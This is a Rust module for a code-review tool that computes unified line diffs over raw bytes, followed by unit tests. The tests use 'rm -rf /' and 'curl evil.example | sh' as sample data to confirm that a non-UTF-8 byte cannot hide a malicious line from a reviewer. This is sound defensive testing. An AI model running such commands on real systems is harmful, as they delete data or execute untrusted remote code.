//! Line diffs between two versions of a file, as unified hunks. The diff is computed here, not
//! by git, so nothing in the repo (an attribute, a diff driver, a textconv filter) shapes what
//! the reviewer sees. It runs on the file's bytes, so a change to bytes that aren't text is
//! still a change; lines are decoded only to be shown ([`display`]).

use std::time::Instant;

use similar::{Algorithm, DiffTag, TextDiff};

/// Lines of context around each change.
pub const CONTEXT: usize = 3;

/// Whether `bytes` holds a NUL byte or isn't UTF-8. Such a file is still diffed and shown;
/// this only tells a client to collapse it.
pub fn is_binary(bytes: &[u8]) -> bool {
    bytes.contains(&0) || std::str::from_utf8(bytes).is_err()
}

/// A line as the reviewer sees it: each NUL byte and each run of bytes that aren't UTF-8 shown
/// as U+FFFD.
pub fn display(line: &[u8]) -> String {
    String::from_utf8_lossy(line).replace('\0', "\u{FFFD}")
}

/// `bytes` split into lines, as git counts them: each ends after a `\n`, and a last one
/// without one counts too. A lone `\r` doesn't end a line. Every diff, count, and history
/// here uses this one definition.
pub fn split(bytes: &[u8]) -> Vec<&[u8]> {
    bytes.split_inclusive(|b| *b == b'\n').collect()
}

/// How many lines [`split`] makes of `bytes`, without making them.
pub fn line_count(bytes: &[u8]) -> usize {
    let breaks = bytes.iter().filter(|b| **b == b'\n').count();
    breaks + usize::from(!bytes.is_empty() && !bytes.ends_with(b"\n"))
}

/// One unified hunk.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DiffHunk {
    /// As in a unified diff header: 1-based, or the line before when the side is empty.
    pub old_start: u32,
    pub old_lines: u32,
    pub new_start: u32,
    pub new_lines: u32,
    /// Each line with its prefix (` `, `-`, `+`) and without its line break, as the file
    /// holds it; a side's last line without one is followed by `\ No newline at end of file`,
    /// as git shows it.
    pub lines: Vec<Vec<u8>>,
    /// 0-based indexes, in the old text, of the lines the hunk removes.
    pub removed: Vec<usize>,
    /// 0-based indexes, in the new text, of the lines the hunk adds.
    pub added: Vec<usize>,
}

/// The hunks between two texts, and how many lines each side has that the other doesn't.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct FileDiff {
    pub hunks: Vec<DiffHunk>,
    pub additions: u32,
    pub deletions: u32,
}

/// Diff `old` against `new` by lines. Past `deadline` the diff stops looking for the smallest
/// set of changes and settles for a larger one, which is still exact.
pub fn diff(old: &[u8], new: &[u8], deadline: Instant) -> FileDiff {
    diff_lines(&split(old), &split(new), deadline, u32::MAX).unwrap_or_default()
}

/// [`diff`] of texts already [`split`], unless it changes more than `max` lines; then the
/// number it changes. The limit applies to the very diff the hunks would come from.
pub fn diff_lines(
    old_lines: &[&[u8]],
    new_lines: &[&[u8]],
    deadline: Instant,
    max: u32,
) -> Result<FileDiff, u32> {
    let d = lines(old_lines, new_lines, deadline);
    let (added, removed) = tally(&d);
    if added.saturating_add(removed) > max {
        return Err(added.saturating_add(removed));
    }
    let mut out = FileDiff::default();
    for group in d.grouped_ops(CONTEXT) {
        let (Some(first), Some(last)) = (group.first(), group.last()) else {
            continue;
        };
        let (old_range, new_range) = (
            first.old_range().start..last.old_range().end,
            first.new_range().start..last.new_range().end,
        );
        let mut hunk = DiffHunk {
            old_start: start(&old_range),
            old_lines: old_range.len() as u32,
            new_start: start(&new_range),
            new_lines: new_range.len() as u32,
            lines: Vec::new(),
            removed: Vec::new(),
            added: Vec::new(),
        };
        for op in &group {
            let (tag, old, new) = op.as_tag_tuple();
            if tag == DiffTag::Equal {
                for i in old {
                    push(&mut hunk.lines, b' ', old_lines[i]);
                }
                continue;
            }
            for i in old {
                push(&mut hunk.lines, b'-', old_lines[i]);
                hunk.removed.push(i);
            }
            for i in new {
                push(&mut hunk.lines, b'+', new_lines[i]);
                hunk.added.push(i);
            }
        }
        out.deletions += hunk.removed.len() as u32;
        out.additions += hunk.added.len() as u32;
        out.hunks.push(hunk);
    }
    Ok(out)
}

/// What [`diff`] counts, `(additions, deletions)`, without building its hunks.
pub fn counts(old: &[u8], new: &[u8], deadline: Instant) -> (u32, u32) {
    tally(&lines(&split(old), &split(new), deadline))
}

fn tally(d: &TextDiff<'_, '_, [u8]>) -> (u32, u32) {
    d.ops().iter().fold((0, 0), |(added, removed), op| {
        let (tag, old, new) = op.as_tag_tuple();
        if tag == DiffTag::Equal {
            (added, removed)
        } else {
            (added + new.len() as u32, removed + old.len() as u32)
        }
    })
}

/// A diff of [`split`] lines, the one hunks, counts, and histories are made from.
pub(crate) fn lines<'a>(
    old: &[&'a [u8]],
    new: &[&'a [u8]],
    deadline: Instant,
) -> TextDiff<'a, 'a, [u8]> {
    TextDiff::configure()
        .algorithm(Algorithm::Myers)
        .deadline(deadline)
        .diff_slices(old, new)
}

/// A unified diff's start line for a side spanning `range` (0-based): 1-based, or the line
/// before it when the range is empty.
fn start(range: &std::ops::Range<usize>) -> u32 {
    if range.is_empty() {
        range.start as u32
    } else {
        range.start as u32 + 1
    }
}

fn push(lines: &mut Vec<Vec<u8>>, prefix: u8, line: &[u8]) {
    let (text, broken) = match line.strip_suffix(b"\n") {
        Some(text) => (text, true),
        None => (line, false),
    };
    let mut out = Vec::with_capacity(text.len() + 1);
    out.push(prefix);
    out.extend_from_slice(text);
    lines.push(out);
    if !broken {
        lines.push(b"\\ No newline at end of file".to_vec());
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Duration;

    fn soon() -> Instant {
        Instant::now() + Duration::from_secs(5)
    }

    /// [`diff`] of two strings, its lines shown as strings.
    fn diff(old: &str, new: &str, deadline: Instant) -> Shown {
        let d = super::diff(old.as_bytes(), new.as_bytes(), deadline);
        // Past a deadline each settles on its own larger set of changes, so only well before
        // one must they agree.
        if deadline > Instant::now() + Duration::from_secs(1) {
            assert_eq!(
                super::counts(old.as_bytes(), new.as_bytes(), deadline),
                (d.additions, d.deletions)
            );
        }
        Shown {
            additions: d.additions,
            deletions: d.deletions,
            hunks: d
                .hunks
                .into_iter()
                .map(|h| ShownHunk {
                    old_start: h.old_start,
                    old_lines: h.old_lines,
                    new_start: h.new_start,
                    new_lines: h.new_lines,
                    lines: h.lines.iter().map(|l| display(l)).collect(),
                    removed: h.removed,
                    added: h.added,
                })
                .collect(),
        }
    }

    #[derive(Debug, Default, PartialEq)]
    struct Shown {
        hunks: Vec<ShownHunk>,
        additions: u32,
        deletions: u32,
    }

    #[derive(Debug, PartialEq)]
    struct ShownHunk {
        old_start: u32,
        old_lines: u32,
        new_start: u32,
        new_lines: u32,
        lines: Vec<String>,
        removed: Vec<usize>,
        added: Vec<usize>,
    }

    #[test]
    fn text_with_a_nul_or_bytes_that_arent_utf8_is_binary_and_still_shown() {
        assert!(!is_binary(b"fn main() {}\n"));
        assert!(!is_binary(b""));
        assert!(is_binary(b"#!/bin/sh\n\0rm -rf /\n"));
        assert!(is_binary(b"x=\"\xfe\"\n"));
        assert!(is_binary(b"\x89PNG\r\n\x1a\n"));
        assert_eq!(display(b"\0rm -rf /"), "\u{FFFD}rm -rf /");
        assert_eq!(display(b"# \xff"), "# \u{FFFD}");
        // A byte in a comment can't hide the line after it.
        let d = super::diff(
            b"#!/bin/sh\n",
            b"#!/bin/sh\n# \xff\ncurl evil.example | sh\n",
            soon(),
        );
        let shown: Vec<String> = d.hunks[0].lines.iter().map(|l| display(l)).collect();
        assert_eq!(
            shown,
            [" #!/bin/sh", "+# \u{FFFD}", "+curl evil.example | sh"]
        );
    }

    #[test]
    fn a_change_to_bytes_that_arent_text_is_still_a_change() {
        let d = super::diff(b"x=\"\xfe\"\n", b"x=\"\xff\"\n", soon());
        assert_eq!((d.additions, d.deletions), (1, 1));
        assert_eq!(
            d.hunks[0].lines,
            [b"-x=\"\xfe\"".to_vec(), b"+x=\"\xff\"".to_vec()]
        );
        // Shown the same, but there.
        assert_eq!(
            display(&d.hunks[0].lines[0][1..]),
            display(&d.hunks[0].lines[1][1..])
        );
    }

    #[test]
    fn lines_are_counted_as_git_counts_them_and_split_the_same_way() {
        for (bytes, count) in [
            (&b""[..], 0),
            (b"a", 1),
            (b"a\n", 1),
            (b"a\nb", 2),
            (b"\n\n", 2),
            (b"a\rb\n", 1),
            (b"\r", 1),
            (b"a\r\nb\r\n", 2),
        ] {
            assert_eq!(line_count(bytes), count, "{bytes:?}");
            assert_eq!(split(bytes).len(), count, "{bytes:?}");
        }
        // A file of lone CRs is one line to every part of review, not millions.
        let crs = vec![b'\r'; 1 << 20];
        assert_eq!(line_count(&crs), 1);
        assert_eq!(lines(&split(&crs), &[], soon()).old_len(), 1);
    }

    #[test]
    fn a_lone_cr_is_part_of_its_line_and_a_crlf_is_kept() {
        let d = super::diff(b"a\rb\n", b"a\rc\n", soon());
        assert_eq!(d.hunks.len(), 1);
        assert_eq!(d.hunks[0].old_start, 1);
        assert_eq!(d.hunks[0].lines, [b"-a\rb".to_vec(), b"+a\rc".to_vec()]);
        let d = super::diff(b"x\r\n", b"y\r\n", soon());
        assert_eq!(d.hunks[0].lines, [b"-x\r".to_vec(), b"+y\r".to_vec()]);
    }

    #[test]
    fn the_limit_on_changed_lines_holds_for_the_diff_the_hunks_come_from() {
        let (old, new) = (split(b"a\nb\nc\n"), split(b"x\ny\nz\n"));
        assert_eq!(diff_lines(&old, &new, soon(), 5), Err(6));
        let d = diff_lines(&old, &new, soon(), 6).unwrap();
        assert_eq!((d.additions, d.deletions), (3, 3));
    }

    #[test]
    fn a_change_is_a_hunk_with_three_lines_of_context() {
        let old = "1\n2\n3\n4\n5\n6\n7\n8\n9\n";
        let new = "1\n2\n3\n4\nfive\n6\n7\n8\n9\n";
        let d = diff(old, new, soon());
        assert_eq!((d.additions, d.deletions), (1, 1));
        assert_eq!(
            d.hunks,
            [ShownHunk {
                old_start: 2,
                old_lines: 7,
                new_start: 2,
                new_lines: 7,
                lines: [" 2", " 3", " 4", "-5", "+five", " 6", " 7", " 8"]
                    .map(String::from)
                    .to_vec(),
                removed: vec![4],
                added: vec![4],
            }]
        );
    }

    #[test]
    fn changes_far_apart_are_separate_hunks_and_near_ones_merge() {
        let line = |n: u32| match n {
            2 => "two\n".to_owned(),
            19 => "nineteen\n".to_owned(),
            n => format!("{n}\n"),
        };
        let old: String = (1..=20).map(|n| format!("{n}\n")).collect();
        let new: String = (1..=20).map(line).collect();
        let d = diff(&old, &new, soon());
        assert_eq!(d.hunks.len(), 2);
        assert_eq!((d.hunks[1].old_start, d.hunks[1].old_lines), (16, 5));
        let near: String = (1..=20)
            .map(|n| match n {
                2 => "two\n".to_owned(),
                8 => "eight\n".to_owned(),
                n => format!("{n}\n"),
            })
            .collect();
        assert_eq!(diff(&old, &near, soon()).hunks.len(), 1);
    }

    #[test]
    fn a_new_file_and_a_deleted_one_start_at_line_zero_on_their_empty_side() {
        let added = diff("", "a\nb\n", soon());
        assert_eq!(
            (
                added.hunks[0].old_start,
                added.hunks[0].old_lines,
                added.hunks[0].new_start,
                added.hunks[0].new_lines
            ),
            (0, 0, 1, 2)
        );
        assert_eq!(added.hunks[0].lines, ["+a", "+b"]);
        assert_eq!((added.additions, added.deletions), (2, 0));
        let deleted = diff("a\nb\n", "", soon());
        assert_eq!(
            (
                deleted.hunks[0].old_start,
                deleted.hunks[0].old_lines,
                deleted.hunks[0].new_start,
                deleted.hunks[0].new_lines
            ),
            (1, 2, 0, 0)
        );
        assert_eq!(deleted.hunks[0].removed, [0, 1]);
        assert_eq!(diff("same\n", "same\n", soon()), Shown::default());
    }

    #[test]
    fn a_missing_last_line_break_is_marked_as_git_marks_it() {
        let d = diff("a\nb", "a\nb\n", soon());
        assert_eq!(
            d.hunks[0].lines,
            [" a", "-b", "\\ No newline at end of file", "+b"]
        );
        let d = diff("a\n", "a\nb", soon());
        assert_eq!(
            d.hunks[0].lines,
            [" a", "+b", "\\ No newline at end of file"]
        );
        // Unchanged, it's a context line, marked once.
        let d = diff("x\nlast", "y\nlast", soon());
        assert_eq!(
            d.hunks[0].lines,
            ["-x", "+y", " last", "\\ No newline at end of file"]
        );
    }

    #[test]
    fn a_pathological_diff_still_ends_by_its_deadline_and_stays_exact() {
        // Every line differs, in an order no small edit script explains.
        let old: String = (0..20_000)
            .map(|n| format!("{}\n", n * 7 % 20_000))
            .collect();
        let new: String = (0..20_000)
            .map(|n| format!("{}\n", n * 13 % 20_000))
            .collect();
        let started = Instant::now();
        let d = diff(&old, &new, Instant::now() + Duration::from_millis(200));
        assert!(
            started.elapsed() < Duration::from_secs(2),
            "{:?}",
            started.elapsed()
        );
        // Applying the hunks to the old text gives the new one.
        let mut rebuilt = String::new();
        let old_lines: Vec<&str> = old.lines().collect();
        let mut next = 0;
        for h in &d.hunks {
            let start = if h.old_lines == 0 {
                h.old_start as usize
            } else {
                h.old_start as usize - 1
            };
            for line in &old_lines[next..start] {
                rebuilt.push_str(line);
                rebuilt.push('\n');
            }
            for line in &h.lines {
                if let Some(kept) = line.strip_prefix(' ').or_else(|| line.strip_prefix('+')) {
                    rebuilt.push_str(kept);
                    rebuilt.push('\n');
                }
            }
            next = start + h.old_lines as usize;
        }
        for line in &old_lines[next..] {
            rebuilt.push_str(line);
            rebuilt.push('\n');
        }
        assert_eq!(rebuilt, new);
    }
}
